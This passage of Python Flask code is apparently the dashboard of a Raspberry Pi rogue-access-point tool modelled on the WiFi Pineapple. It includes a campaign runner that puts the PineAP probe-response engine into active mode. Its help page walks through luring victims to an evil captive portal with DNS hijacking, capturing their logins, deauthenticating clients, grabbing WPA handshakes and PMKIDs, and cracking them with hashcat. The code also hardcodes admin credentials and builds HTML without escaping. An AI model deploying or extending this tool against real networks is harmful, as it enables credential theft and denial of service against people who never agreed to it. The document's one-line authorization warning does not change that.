        js += 'document.getElementById("loot-msg").textContent=r.ok?"Report saved: "+r.filename:r.error;'
        js += 'if(r.ok)setTimeout(()=>location.reload(),1500);}'
        js += '</script>'
        return page('Loot', c, 'loot', js)

    # ── CAMPAIGNS PAGE ────────────────────────────────────────────────────────
    @app.route('/campaigns')
    @require_auth
    def campaigns_page():
        os.makedirs(CAMPAIGNS_DIR, exist_ok=True)
        camps = []
        for d in sorted(glob.glob(os.path.join(CAMPAIGNS_DIR, '*')), reverse=True):
            mf = os.path.join(d, 'meta.json')
            if os.path.isfile(mf):
                try:
                    with open(mf) as fh:
                        m = json.load(fh)
                    m['id'] = os.path.basename(d)
                    camps.append(m)
                except Exception:
                    pass

        tc = {'recon': 'bb', 'passive': 'bg', 'active': 'br'}
        camp_rows = ''
        for camp in camps:
            cid    = camp['id']
            ctype  = camp.get('type', '?')
            badge  = tc.get(ctype, 'bb')
            status = camp.get('status', '?')
            started = camp.get('started', '')
            dur    = str(camp.get('duration', 0))
            rpt    = camp.get('report', '')
            dl = ''
            if rpt:
                dl = ('<a href="/api/loot/download/' + rpt + '" '
                      'class="btn btn-outline" '
                      'style="padding:3px 10px;font-size:0.75rem;margin-right:4px">'
                      '&#128196;</a>')
            camp_rows += ('<tr>'
                         '<td><code style="font-size:0.8rem">' + cid + '</code></td>'
                         '<td><span class="badge ' + badge + '">' + ctype + '</span></td>'
                         '<td style="font-size:0.8rem">' + status + '</td>'
                         '<td style="font-size:0.75rem;color:var(--dim)">' + started + '</td>'
                         '<td style="font-size:0.75rem;color:var(--dim)">' + dur + 's</td>'
                         '<td>' + dl
                         + "<button onclick=\"deleteCamp('" + cid + "')\" "
                         + 'class="btn btn-danger" style="padding:3px 10px;font-size:0.75rem">'
                         + '&#10005;</button></td></tr>')
        if not camp_rows:
            camp_rows = ('<tr><td colspan=6 style="text-align:center;color:var(--dim)">'
                        'No campaigns yet</td></tr>')

        c = (
            '<div style="display:grid;grid-template-columns:1fr 1.5fr;gap:24px">'
            '<div><div class="sh"><span class="st">New Campaign</span></div>'
            '<div class="card">'
            '<div class="fg" style="margin-bottom:12px"><label>Campaign Type</label>'
            '<select id="camp-type" style="background:var(--bg);border:1px solid var(--bdr);'
            'color:var(--txt);padding:10px 14px;border-radius:8px;font-size:0.875rem">'
            '<option value="recon">Recon Only - passive WiFi scan</option>'
            '<option value="passive">Passive Assessment - PineAP passive + logging</option>'
            '<option value="active">Active Assessment - PineAP active + beacon flood</option>'
            '</select></div>'
            '<div class="fg" style="margin-bottom:12px">'
            '<label>Duration: <span id="dur-label">120</span>s</label>'
            '<input type="range" id="camp-dur" min="30" max="3600" value="120" step="30" '
            "oninput=\"document.getElementById('dur-label').textContent=this.value\" "
            'style="width:100%;margin-top:8px"></div>'
            '<div class="fg" style="margin-bottom:16px"><label>Description (optional)</label>'
            '<input id="camp-desc" placeholder="e.g. Home lab session 1" '
            'style="background:var(--bg);border:1px solid var(--bdr);color:var(--txt);'
            'padding:8px 12px;border-radius:6px;width:100%"></div>'
            '<button class="btn btn-acc" onclick="startCampaign()">&#9654; Start Campaign</button>'
            '<div id="camp-msg" style="margin-top:12px;font-size:0.8rem;color:var(--acc)"></div>'
            '</div></div>'

            '<div><div class="sh"><span class="st">Campaign History</span>'
            '<button class="btn btn-outline" onclick="location.reload()" '
            'style="font-size:0.75rem">&#8635; Refresh</button></div>'
            '<div class="twrap"><table><thead><tr>'
            '<th>ID</th><th>Type</th><th>Status</th><th>Started</th>'
            '<th>Duration</th><th>Actions</th></tr></thead>'
            '<tbody>' + camp_rows + '</tbody></table></div></div></div>'
        )

        js = ('<script>let campPoller=null;'
              'async function startCampaign(){'
              'const type=document.getElementById("camp-type").value;'
              'const duration=parseInt(document.getElementById("camp-dur").value);'
              'const desc=document.getElementById("camp-desc").value.trim();'
              'const msg=document.getElementById("camp-msg");'
              'msg.textContent="Starting...";'
              'const r=await api("/api/campaigns/create","POST",'
              '{type:type,duration:duration,desc:desc});'
              'if(r.ok){'
              'msg.textContent="Campaign "+r.id+" running ("+duration+"s)...";'
              'msg.style.color="var(--grn)";'
              'campPoller=setInterval(async()=>{'
              'const s=await(await fetch("/api/campaigns/status/"+r.id)).json();'
              'if(s.status!=="running"){'
              'clearInterval(campPoller);'
              'msg.textContent="Done - "+s.status;'
              'setTimeout(()=>location.reload(),1500);}},3000);'
              '}else{msg.textContent="Error: "+r.error;msg.style.color="var(--red)";}}'
              'async function deleteCamp(id){'
              'if(!confirm("Delete campaign "+id+"?"))return;'
              'const r=await api("/api/campaigns/delete","POST",{id:id});'
              'if(r.ok)location.reload();}'
              '</script>')
        return page('Campaigns', c, 'campaigns', js)

    @app.route('/api/campaigns/create', methods=['POST'])
    @require_auth
    def api_camp_create():
        d = request.json or {}
        ctype    = d.get('type', 'recon')
        duration = max(10, min(int(d.get('duration', 120)), 3600))
        desc     = d.get('desc', '')
        camp_id  = time.strftime('%Y%m%d_%H%M%S')
        camp_dir = os.path.join(CAMPAIGNS_DIR, camp_id)
        os.makedirs(camp_dir, exist_ok=True)
        meta = {'type': ctype, 'duration': duration, 'desc': desc,
                'started': time.strftime('%Y-%m-%d %H:%M:%S'),
                'status': 'running', 'report': None}
        with open(os.path.join(camp_dir, 'meta.json'), 'w') as fh:
            json.dump(meta, fh)

        def run():
            try:
                if ctype in ('passive', 'active'):
                    cfg = load_pineap_cfg()
                    cfg['log_probes'] = True
                    cfg['mode'] = 'active' if ctype == 'active' else 'passive'
                    if ctype == 'active':
                        cfg['beacon_response'] = True
                    save_pineap_cfg(cfg)
                    subprocess.run(['systemctl', 'restart', 'pinapple-pineap'],
                                   capture_output=True)
                time.sleep(duration)
            except Exception:
                pass
            meta['status'] = 'completed'
            with open(os.path.join(camp_dir, 'meta.json'), 'w') as fh:
                json.dump(meta, fh)

        threading.Thread(target=run, daemon=True).start()
        return jsonify({'ok': True, 'id': camp_id})

    @app.route('/api/campaigns/status/<camp_id>')
    @require_auth
    def api_camp_status(camp_id):
        if not re.match(r'^\d{8}_\d{6}$', camp_id):
            return jsonify({'ok': False, 'error': 'invalid id'})
        mf = os.path.join(CAMPAIGNS_DIR, camp_id, 'meta.json')
        try:
            with open(mf) as fh:
                return jsonify(json.load(fh))
        except Exception:
            return jsonify({'status': 'unknown'})

    @app.route('/api/campaigns/delete', methods=['POST'])
    @require_auth
    def api_camp_delete():
        cid = (request.json or {}).get('id', '')
        if not re.match(r'^\d{8}_\d{6}$', cid):
            return jsonify({'ok': False, 'error': 'invalid id'})
        d = os.path.join(CAMPAIGNS_DIR, cid)
        if os.path.isdir(d):
            shutil.rmtree(d)
        return jsonify({'ok': True})

    # -- HELP / DOCS PAGE
    @app.route('/help')
    @require_auth
    def help_page():
        def section(icon, title, body):
            return ('<div class="card" style="margin-bottom:20px">'
                    '<div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;'
                    'padding-bottom:10px;border-bottom:1px solid var(--bdr)">'
                    '<span style="font-size:1.5rem">'+icon+'</span>'
                    '<h2 style="font-size:1rem;font-weight:600;color:var(--acc)">'+title+'</h2></div>'
                    +body+'</div>')
        def step(n, text):
            return ('<div style="display:flex;gap:12px;margin-bottom:10px">'
                    '<span style="background:var(--acc);color:#000;border-radius:50%;'
                    'width:24px;height:24px;display:flex;align-items:center;justify-content:center;'
                    'font-size:0.75rem;font-weight:700;flex-shrink:0">'+str(n)+'</span>'
                    '<span style="font-size:0.875rem;line-height:1.6">'+text+'</span></div>')
        def tip(text, col='acc'):
            return ('<div style="background:rgba(0,212,170,0.06);border-left:3px solid var(--'+col+');'
                    'padding:10px 14px;border-radius:0 6px 6px 0;margin-bottom:10px;'
                    'font-size:0.8rem;line-height:1.6">'+text+'</div>')
        def code(text):
            return '<code style="background:var(--bg);padding:2px 6px;border-radius:4px;font-size:0.8rem">'+text+'</code>'
        qs  = step(1,'Connect to Pi at <strong>10.42.0.42</strong>, dashboard on port 8080')
        qs += step(2,'Login: user <strong>admin</strong> / pass <strong>pinapple</strong>')
        qs += step(3,'<strong>AP Control</strong> &mdash; set SSID, start rogue AP on wlan0')
        qs += step(4,'<strong>Settings</strong> &mdash; choose portal type, enable DNS hijack')
        qs += step(5,'Victims connect to your AP, get redirected to captive portal')
        qs += step(6,'<strong>Credentials</strong> page shows captured logins in real time')
        rg  = tip('wlan1 (AR9271) must be in monitor mode &mdash; starts via pinapple-monitor.service')
        rg += step(1,'<strong>WLAN1 Attacks &rarr; Probes</strong> &mdash; see SSIDs nearby devices seek')
        rg += step(2,'<strong>Tracker</strong> tab &mdash; all 802.11 devices in air with frame types')
        rg += step(3,'<strong>Recon</strong> page &mdash; nearby APs with SSID/BSSID/channel/signal')
        rg += step(4,'Import SSIDs into <strong>PineAP Suite</strong> SSID pool for probe response')
        rg += step(5,'Set PineAP to <strong>Active</strong> mode to lure devices to your AP')
        pg  = step(1,'<strong>Settings</strong> &rarr; choose portal: Credentials, Hotel, or Splash')
        pg += step(2,'<strong>Evil Portal Test</strong> at bottom of Settings &mdash; live iframe preview')
        pg += step(3,'With DNS hijack ON, all HTTP from clients goes to portal at 10.0.0.1')
        pg += step(4,'Captured creds appear in <strong>Credentials</strong> page and creds.log')
        pg += tip('Customize portals in '+code('/opt/pinapple/portal/')+'  &mdash; edit creds.html, hotel.html, splash.html')
        ag  = tip('ALL attack features require explicit authorization. Only use on networks you own or have written permission to test.','danger')
        ag += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">'
        for atitle, apath, adesc in [
                ('&#9889; Deauth','WLAN1 Attacks &rarr; Deauth','Sends 802.11 deauth frames to disconnect clients. Forces WPA2 handshake re-association.'),
                ('&#128274; Handshake','WLAN1 Attacks &rarr; Handshake','Captures 4-way handshake to .cap file. Crack offline with hashcat -m 22000.'),
                ('&#128477; PMKID','WLAN1 Attacks &rarr; PMKID','Clientless WPA2 via hcxdumptool. No connected client needed. Auto-converts to .22000 on stop.'),
                ('&#9881; MDK4','WLAN1 Attacks &rarr; MDK4','Four modes: Deauth flood, Beacon flood, Auth DoS, EAPOL logoff.')]:
            ag += '<div style="padding:12px;background:var(--bg);border-radius:8px">'
            ag += '<div style="font-size:0.8rem;font-weight:600;color:var(--txt);margin-bottom:6px">'+atitle+'</div>'
            ag += '<div style="font-size:0.75rem;color:var(--dim);margin-bottom:4px">'+code(apath)+'</div>'
            ag += '<div style="font-size:0.78rem;color:var(--dim);line-height:1.6">'+adesc+'</div>'
            ag += '</div>'
        ag += '</div>'
        lg  = step(1,'All captured files stored in '+code('/var/log/pinapple/loot/'))
        lg += step(2,'<strong>Loot</strong> page &mdash; browse, download, delete captured files')
        lg += step(3,'Click <strong>Generate Report</strong> for an HTML audit summary')
        lg += step(4,'Upload .pcap to WPA-Sec for free cloud GPU cracking')
        lg += tip('Offline: '+code('hashcat -m 22000 capture.22000 /usr/share/wordlists/rockyou.txt'))
        cg  = step(1,'<strong>Campaigns</strong> &rarr; New Campaign &mdash; set mode and duration')
        cg += step(2,'<strong>Recon Only</strong>: passive scan, no active attacks')
        cg += step(3,'<strong>Passive Assessment</strong>: PineAP passive + probe logging')
        cg += step(4,'<strong>Active Assessment</strong>: PineAP active + beacon response')
        cg += step(5,'Campaign auto-completes after set duration; review notes in Campaigns page')
        sref  = '<div style="font-size:0.8rem;line-height:2">'
        sref += '<strong>Services</strong><br>'
        for svc, sdesc in [('pinapple-ap','hostapd rogue AP on wlan0'),
                           ('pinapple-dhcp','dnsmasq DHCP+DNS on 10.0.0.0/24'),
                           ('pinapple-monitor','wlan1 monitor mode setup'),
                           ('pinapple-pineap','probe response engine'),
                           ('pinapple-dashboard','Flask dashboard on :8080')]:
            sref += code(svc)+' &mdash; '+sdesc+'<br>'
        sref += '<br><strong>Key files</strong><br>'
        for spath, sdesc2 in [('/var/log/pinapple/creds.log','captured credentials (JSON lines)'),
                              ('/var/log/pinapple/loot/','pcap / hashes / reports'),
                              ('/etc/pinapple/ssid_pool.txt','PineAP SSID pool'),
                              ('/etc/pinapple/pineap_config.json','PineAP mode config'),
                              ('/opt/pinapple/portal/','captive portal HTML files')]:
            sref += code(spath)+' &mdash; '+sdesc2+'<br>'
        sref += '</div>'
        c  = '<div style="max-width:880px">'
        c += section('&#9889;','Quick Start',qs)
        c += section('&#10792;','WiFi Reconnaissance',rg)
        c += section('&#127760;','Evil Portal',pg)
        c += section('&#128477;','Attack Tools',ag)
        c += section('&#127891;','Loot &amp; Reporting',lg)
        c += section('&#128241;','Campaigns',cg)
        c += section('&#9881;','System Reference',sref)
        c += '</div>'
        return page('Documentation', c, 'help')

